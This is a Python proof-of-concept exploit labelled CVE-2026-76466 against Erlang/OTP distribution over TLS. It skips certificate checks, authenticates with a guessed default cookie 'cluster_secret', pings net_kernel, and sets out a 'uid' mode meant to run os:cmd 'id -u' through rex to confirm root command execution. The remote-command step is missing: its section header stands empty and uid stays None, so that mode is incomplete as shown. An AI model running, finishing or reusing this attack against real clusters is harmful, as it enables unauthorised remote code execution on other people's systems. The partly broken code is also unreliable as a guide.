#!/usr/bin/env python3
import argparse
import hashlib
import random
import socket
import ssl
import struct
import sys
import time

# ── Negotiated distribution flags (match the validated OTP 26 harness) ──
DIST_FLAGS = 0x0D07DF7FBD
CREATION = 4  # node incarnation

# ── My process ids (arbitrary but stable, mirror the validated harness) ──
PID_NET = (9, 0)     # net_kernel-side caller
PID_REX = (57, 0)    # rex connection process
PID_GNS = (59, 0)    # global_name_server connection process
PID_GL = (86, 0)     # group leader for spawned process

MY_CONNID = -576460752303423488   # my rex alias/connection id


# ═══════════════════════════════════════════════════════════════════════
# ETF encoding (outgoing terms — sent under dist header with 0 cached atoms)
# ═══════════════════════════════════════════════════════════════════════

def atom(s):
    """SMALL_ATOM_UTF8_EXT (119)."""
    b = s.encode()
    return bytes([119, len(b)]) + b


def pid(node_atom, ident, serial=0, creation=CREATION):
    """NEW_PID_EXT (88): node atom + id u32 + serial u32 + creation u32."""
    return (bytes([88]) + node_atom
            + struct.pack(">II", ident, serial)
            + struct.pack(">I", creation))


def reencode_pid(decoded):
    """Re-encode a decoded ('PID', node, id, serial, creation) term."""
    _, node, i, s, c = decoded
    return bytes([88]) + atom(node) + struct.pack(">II", i, s) \
        + struct.pack(">I", c)


def ref(node_atom, nids=3):
    """NEWER_REFERENCE_EXT (90): u16 n + node atom + u32 creation + n*u32 ids.

    Returns (encoded, ids) so callers can match echoes."""
    ids = [random.getrandbits(31) for _ in range(nids)]
    return (bytes([90]) + struct.pack(">H", len(ids))
            + node_atom + struct.pack(">I", CREATION)
            + b"".join(struct.pack(">I", x) for x in ids)), ids


def small_int(v):
    """SMALL_INTEGER_EXT (97)."""
    return bytes([97, v])


def big_integer(v):
    """SMALL_BIG_EXT (110) for 64-bit values."""
    return bytes([110, 8, 1 if v < 0 else 0]) + abs(v).to_bytes(8, "little")


def tup(*elems):
    """SMALL_TUPLE_EXT (104)."""
    return bytes([104, len(elems)]) + b"".join(elems)


def lst(elems):
    """LIST_EXT (108) with NIL tail."""
    return (bytes([108]) + struct.pack(">I", len(elems))
            + b"".join(elems) + bytes([106]))


def binary(s):
    """BINARY_EXT (109)."""
    b = s.encode()
    return bytes([109]) + struct.pack(">I", len(b)) + b


def string_ext(s):
    """STRING_EXT (107) — charlist, required by os:cmd/1."""
    b = s.encode("latin1")
    return bytes([107]) + struct.pack(">H", len(b)) + b


# ═══════════════════════════════════════════════════════════════════════
# ETF decoding (incoming terms — with atom cache + dist header)
# ═══════════════════════════════════════════════════════════════════════

class Decoder:
    def __init__(self):
        self.atom_cache = {}  # persistent per connection: cix -> atom bytes

    def parse_frame(self, body):
        """body = frame content after u32 length. Returns (ctl, msg) terms."""
        if body[:1] != b"\x83":
            raise ValueError("bad frame tag %s" % body[:1].hex())
        if body[1:2] != b"D":
            raise ValueError("expected dist header")
        count = body[2]
        off = 3
        self.tab = {}
        if count:
            flgs = body[off:off + (count >> 1) + 1]
            off += len(flgs)
            long_atoms = bool(flgs[-1] & (1 if count % 2 == 0 else 0x10))
            for tix in range(count):
                nib = (flgs[tix >> 1] >> ((tix & 1) * 4)) & 0xF
                internal = body[off]
                off += 1
                cix = ((nib & 7) << 8) + internal
                if nib & 8:
                    if long_atoms:
                        ln = struct.unpack(">H", body[off:off + 2])[0]
                        off += 2
                    else:
                        ln = body[off]
                        off += 1
                    name = body[off:off + ln]
                    off += ln
                    self.atom_cache[cix] = name
                    self.tab[tix] = name
                else:
                    self.tab[tix] = self.atom_cache.get(cix, b"?")
        self.off = off
        terms = []
        while self.off < len(body):
            terms.append(self.decode_term(body))
        return terms

    def decode_term(self, buf):
        tag = buf[self.off]
        self.off += 1
        if tag == 97:
            v = buf[self.off]
            self.off += 1
            return v
        if tag == 98:
            v = struct.unpack(">i", buf[self.off:self.off + 4])[0]
            self.off += 4
            return v
        if tag == 104:
            arity = buf[self.off]
            self.off += 1
            return tuple(self.decode_term(buf) for _ in range(arity))
        if tag == 105:
            arity = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            return tuple(self.decode_term(buf) for _ in range(arity))
        if tag == 106:
            return []
        if tag == 107:
            ln = struct.unpack(">H", buf[self.off:self.off + 2])[0]
            self.off += 2
            s = buf[self.off:self.off + ln]
            self.off += ln
            return s.decode("latin1")
        if tag == 108:
            ln = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            items = [self.decode_term(buf) for _ in range(ln)]
            tail = self.decode_term(buf)
            if tail != []:
                items.append(("|", tail))
            return items
        if tag == 109:
            ln = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            b = buf[self.off:self.off + ln]
            self.off += ln
            return b
        if tag == 110:
            n = buf[self.off]
            self.off += 1
            sign = buf[self.off]
            self.off += 1
            digits = buf[self.off:self.off + n]
            self.off += n
            v = int.from_bytes(digits, "little")
            return -v if sign else v
        if tag == 111:
            n = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            sign = buf[self.off]
            self.off += 1
            digits = buf[self.off:self.off + n]
            self.off += n
            v = int.from_bytes(digits, "little")
            return -v if sign else v
        if tag == 115:
            ln = buf[self.off]
            self.off += 1
            a = buf[self.off:self.off + ln]
            self.off += ln
            return a.decode("latin1")
        if tag == 100:
            ln = struct.unpack(">H", buf[self.off:self.off + 2])[0]
            self.off += 2
            a = buf[self.off:self.off + ln]
            self.off += ln
            return a.decode("latin1")
        if tag == 119:
            ln = buf[self.off]
            self.off += 1
            a = buf[self.off:self.off + ln]
            self.off += ln
            return a.decode()
        if tag == 118:
            ln = struct.unpack(">H", buf[self.off:self.off + 2])[0]
            self.off += 2
            a = buf[self.off:self.off + ln]
            self.off += ln
            return a.decode()
        if tag == 82:
            idx = buf[self.off]
            self.off += 1
            return self.tab.get(idx, b"?ref").decode("utf8", "replace")
        if tag == 103:
            node = self.decode_term(buf)
            i = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            s = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            c = buf[self.off]
            self.off += 1
            return ("PID", node, i, s, c)
        if tag == 88:
            node = self.decode_term(buf)
            i = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            s = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            c = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            return ("PID", node, i, s, c)
        if tag == 101:
            node = self.decode_term(buf)
            i = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            c = buf[self.off]
            self.off += 1
            return ("REF", node, c, [i])
        if tag == 114:
            ln = struct.unpack(">H", buf[self.off:self.off + 2])[0]
            self.off += 2
            node = self.decode_term(buf)
            c = buf[self.off]
            self.off += 1
            ids = [struct.unpack(">I", buf[self.off + 4 * k:self.off + 4 * k + 4])[0]
                   for k in range(ln)]
            self.off += 4 * ln
            return ("REF", node, c, ids)
        if tag == 90:
            ln = struct.unpack(">H", buf[self.off:self.off + 2])[0]
            self.off += 2
            node = self.decode_term(buf)
            c = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            ids = [struct.unpack(">I", buf[self.off + 4 * k:self.off + 4 * k + 4])[0]
                   for k in range(ln)]
            self.off += 4 * ln
            return ("REF", node, c, ids)
        if tag == 116:
            arity = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            pairs = []
            for _ in range(arity):
                k = self.decode_term(buf)
                v = self.decode_term(buf)
                pairs.append((k, v))
            return ("MAP", pairs)
        if tag == 70:
            v = struct.unpack(">d", buf[self.off:self.off + 8])[0]
            self.off += 8
            return v
        if tag == 77:
            ln = struct.unpack(">I", buf[self.off:self.off + 4])[0]
            self.off += 4
            bits = buf[self.off]
            self.off += 1
            b = buf[self.off:self.off + ln]
            self.off += ln
            return ("BITS", b, bits)
        raise ValueError("unknown ETF tag %d" % tag)


def tree_contains(term, text):
    """True if `text` appears anywhere in the decoded term tree."""
    if isinstance(term, str):
        return text in term
    if isinstance(term, (bytes, bytearray)):
        return text.encode() in bytes(term)
    if isinstance(term, tuple):
        return any(tree_contains(x, text) for x in term)
    if isinstance(term, list):
        return any(tree_contains(x, text) for x in term)
    return False


# ═══════════════════════════════════════════════════════════════════════
# Transport
# ═══════════════════════════════════════════════════════════════════════

def _send_raw(sock, data):
    sock.sendall(struct.pack(">I", len(data)) + data)


def _recv_raw(sock, timeout=20):
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 4:
        try:
            d = sock.recv(4 - len(hdr))
        except (socket.timeout, TimeoutError):
            return None
        if not d:
            return None
        hdr += d
    ln = struct.unpack(">I", hdr)[0]
    body = b""
    while len(body) < ln:
        try:
            d = sock.recv(ln - len(body))
        except (socket.timeout, TimeoutError):
            return None
        if not d:
            return None
        body += d
    return body


def tls_connect(host, port, timeout=15):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=timeout)
    return ctx.wrap_socket(raw, server_hostname=host)


# ═══════════════════════════════════════════════════════════════════════
# Distribution handshake (OTP 26 'N' format)
# ═══════════════════════════════════════════════════════════════════════

def dist_handshake(sock, node_name, cookie):
    """Returns (ok, detail). detail = server node name on success."""
    name = node_name.encode()
    hello = (b"N" + struct.pack(">Q", DIST_FLAGS)
             + struct.pack(">I", CREATION)
             + struct.pack(">H", len(name)) + name)
    _send_raw(sock, hello)

    status = _recv_raw(sock)
    if status is None:
        return False, "connection closed after name"
    if status[:1] != b"s":
        return False, "unexpected response"
    stxt = status[1:].decode(errors="replace").strip("\x00")
    if stxt != "ok":
        return False, stxt

    chal = _recv_raw(sock)
    if chal is None or chal[:1] != b"N":
        return False, "no challenge"
    server_challenge = struct.unpack(">I", chal[9:13])[0]
    server_nlen = struct.unpack(">H", chal[17:19])[0]
    server_node = chal[19:19 + server_nlen].decode(errors="replace")

    my_challenge = random.getrandbits(32)
    digest = hashlib.md5(
        cookie.encode() + str(server_challenge).encode()).digest()
    _send_raw(sock, b"r" + struct.pack(">I", my_challenge) + digest)

    ack = _recv_raw(sock)
    if ack is None or ack[:1] != b"a":
        return False, "closed after challenge reply (wrong cookie)"
    expected = hashlib.md5(
        cookie.encode() + str(my_challenge).encode()).digest()
    if ack[1:17] != expected:
        return False, "challenge ack mismatch (wrong cookie)"
    return True, server_node


def send_dist(sock, *terms):
    _send_raw(sock, b"\x83\x44\x00" + b"".join(terms))


# ═══════════════════════════════════════════════════════════════════════
# ping — monitor net_kernel + is_auth query, answer server rex queries,
# expect {[alias|Ref], yes}
# ═══════════════════════════════════════════════════════════════════════

def run_ping(sock, dec, my_node, server_node):
    nk = atom("net_kernel")
    empty = atom("")
    node_atom = atom(my_node)
    mypid = pid(node_atom, *PID_NET)
    myref, myref_ids = ref(node_atom, nids=5)

    # {19, MyPid, net_kernel, MyRef} — monitor the remote net_kernel
    send_dist(sock, tup(small_int(19), mypid, nk, myref))
    # {6, MyPid, '', net_kernel}
    #   + {'$gen_call', {MyPid, [alias|Ref]}, {is_auth, MyNode}}
    alias_tag = lst([atom("alias"), myref])
    msg = tup(atom("$gen_call"), tup(mypid, alias_tag),
              tup(atom("is_auth"), node_atom))
    send_dist(sock, tup(small_int(6), mypid, empty, nk), msg)

    deadline = time.time() + 20
    while time.time() < deadline:
        terms = _recv_raw(sock)
        if terms is None:
            return "connection_closed"
        if terms == b"":
            continue  # tick
        frame = dec.parse_frame(terms)
        if getattr(dec, "debug", False):
            print(f"[DBG] ping recv: {frame}", file=sys.stderr)
        ctl = frame[0]
        op = ctl[0] if isinstance(ctl, tuple) else None

        if op == 33 or op == 22:  # alias_send / send_sender + {Tag, Reply}
            reply = frame[1] if len(frame) > 1 else None
            if (isinstance(reply, tuple) and len(reply) == 2
                    and reply[1] == "yes"
                    and isinstance(reply[0], list) and reply[0]
                    and reply[0][0] == "alias"):
                return "pong"
        elif op == 6 and len(frame) > 1:  # reg_send + msg
            m = frame[1]
            if isinstance(m, tuple) and len(m) == 2 and m[1] == "features_request":
                sender = m[0]
                send_dist(sock, tup(small_int(22),
                                    pid(node_atom, *PID_REX),
                                    reencode_pid(sender)),
                          tup(atom("features_reply"), atom(server_node),
                              lst([atom("erpc")])))
            elif (isinstance(m, tuple) and len(m) == 2
                    and m[0] == "$gen_cast"
                    and isinstance(m[1], tuple) and m[1][0] == "init_connect"):
                ic = m[1]            # {init_connect, {T,ConnId}, Node, {…}, Pid}
                conn_t = ic[1]
                conn_id = conn_t[1] if isinstance(conn_t, tuple) else conn_t
                srv_node = ic[2]
                ack = tup(atom("init_connect_ack"), atom(srv_node),
                          big_integer(conn_id), big_integer(MY_CONNID))
                send_dist(sock, tup(small_int(6),
                                    pid(node_atom, *PID_GNS), empty,
                                    atom("global_name_server")), ack)
        # other ops (monitor/demonitor/send) are ignored
    return "timeout"


# ═══════════════════════════════════════════════════════════════════════
# uid — spawn_request to rex: erpc:execute_call(ReqId, os, cmd, ["id -u"])
# ═══════════════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(description="CVE-2026-76466 PoC")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--node", default="cluster_secret@127.0.0.1")
    p.add_argument("--cookie", default="cluster_secret")
    p.add_argument("--mode", choices=["probe", "ping", "uid"], required=True)
    p.add_argument("--json", action="store_true")
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()

    if args.mode == "probe":
        try:
            w = tls_connect(args.target, args.port)
            print(f"TLS established: {w.version()}")
            w.close()
            return 0
        except Exception as e:
            print(f"probe failed: {e}")
            return 2

    try:
        sock = tls_connect(args.target, args.port)
    except Exception as e:
        print(f"TLS connect failed: {e}")
        return 3

    ok, detail = dist_handshake(sock, args.node, args.cookie)
    if not ok:
        sock.close()
        if detail == "not_allowed":
            print('{"result": "not_allowed"}')
            return 2
        print('{"result": "pang", "detail": "%s"}' % detail)
        return 2

    dec = Decoder()
    if args.debug:
        dec.debug = True
    result = run_ping(sock, dec, args.node, detail)
    if result != "pong":
        print("ping=pang")
        sock.close()
        return 2

    print("ping=pong")
    if args.mode == "ping":
        sock.close()
        return 0

    uid = None
    sock.close()
    if uid == "0\n":
        print("rpc=os:cmd uid=0 result=confirmed")
        return 0
    print(f"rpc=os:cmd result=unexpected ({uid!r})")
    return 3


if __name__ == "__main__":
    sys.exit(main())
